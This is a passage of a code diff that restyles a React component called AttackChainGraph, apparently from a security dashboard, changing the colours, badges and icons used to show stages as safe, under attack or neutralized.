             const isSelected = selectedNodeIndex === i;
-            const isStageNeutralized = isSafe || st.status === 'neutralized' || st.status === 'mitigated' || st.status === 'prevented';
 
             return (
               <div key={st.index} className="flex-1 flex items-center">
@@ -654,12 +878,16 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
                     isSelected
                       ? isSafe
                         ? 'ring-2 ring-emerald-400 shadow-lg shadow-emerald-950/60 scale-[1.02]'
-                        : 'ring-2 ring-cyan-500/80 shadow-lg shadow-cyan-950/50 scale-[1.02]'
+                        : isUnderAttack
+                        ? 'ring-2 ring-red-500/90 shadow-lg shadow-red-950/70 scale-[1.02]'
+                        : 'ring-2 ring-cyan-400 shadow-lg shadow-cyan-950/60 scale-[1.02]'
                       : 'hover:border-slate-500/80 hover:bg-surface-800/60'
                   } ${
-                    isStageNeutralized
+                    isSafe
                       ? 'bg-emerald-950/20 border-emerald-800/50 text-slate-300'
-                      : 'bg-surface-900/90 border-surface-700/80 shadow-md'
+                      : isUnderAttack
+                      ? 'bg-red-950/20 border-red-800/50 text-red-200'
+                      : 'bg-surface-900/90 border-surface-700/80 text-slate-300 hover:border-cyan-500/40'
                   }`}
                 >
                   {/* Top Header */}
@@ -675,8 +903,7 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
                       </div>
                       <span
                         className={`text-[9px] font-mono px-1.5 py-0.5 rounded border uppercase font-semibold ${getStatusBadge(
-                          st.status,
-                          st.statusLabel
+                          st.status
                         )}`}
                       >
                         {st.statusLabel}
@@ -693,7 +920,8 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
 
                   {/* 
                     Bottom Countermeasure Trigger Button:
-                    - GREEN when safe / neutralized
+                    - CYAN when safe / no attack
+                    - GREEN when attack is taken down (30s cooldown)
                     - RED when attack is happening
                   */}
                   <div className="mt-3 pt-2 border-t border-surface-800/60">
@@ -707,13 +935,17 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
                         className={`w-full py-1.5 px-2 rounded text-[10px] font-mono font-semibold flex items-center justify-center gap-1.5 transition-all ${
                           isSafe || state[st.actionType]
                             ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/60 shadow-sm shadow-emerald-950/40 cursor-default'
-                            : 'bg-red-950/90 hover:bg-red-900 text-red-200 border border-red-700/80 hover:shadow-sm shadow-md shadow-red-950/60 animate-pulse'
+                            : isUnderAttack
+                            ? 'bg-red-950/90 hover:bg-red-900 text-red-200 border border-red-700/80 hover:shadow-sm shadow-md shadow-red-950/60 animate-pulse'
+                            : 'bg-cyan-950/70 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-500/50 shadow-sm shadow-cyan-950/40'
                         }`}
                       >
                         {isSafe || state[st.actionType] ? (
                           <CheckCircle2 className="w-3 h-3 text-emerald-400 shrink-0" />
-                        ) : (
+                        ) : isUnderAttack ? (
                           <Zap className="w-2.5 h-2.5 text-red-400 shrink-0" />
+                        ) : (
+                          <Shield className="w-2.5 h-2.5 text-cyan-400 shrink-0" />
                         )}
                         <span className="truncate">{st.actionLabel}</span>
                       </button>
@@ -731,10 +963,10 @@ export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange,
                     <ArrowRight
                       className={`w-3.5 h-3.5 transition-colors ${
                         isSafe
-                          ? 'text-emerald-500/60'
-                          : isAttackHappening
+                          ? 'text-emerald-400'
+                          : isUnderAttack
                           ? 'text-red-400 animate-pulse'
-                          : 'text-slate-600'
+                          : 'text-cyan-500/60'
                       }`}
                     />
                   </div>
